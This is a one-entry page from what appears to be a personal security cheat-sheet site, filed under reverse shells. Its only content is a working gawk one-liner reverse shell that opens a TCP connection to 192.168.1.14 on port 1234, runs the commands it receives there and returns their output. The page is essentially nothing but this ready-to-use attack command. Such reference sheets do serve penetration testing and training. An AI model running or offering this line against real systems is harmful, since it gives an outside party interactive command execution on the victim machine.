---
layout: default
title: gawk
parent: Shells / Reverse Shells
grand_parent: security stuff
nav_order: 2
---

## gawk 
1. gawk one-liner reverse shell  
```gawk 
gawk 'BEGIN{s="/inet/tcp/0/192.168.1.14/1234"; for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)}'
```

---

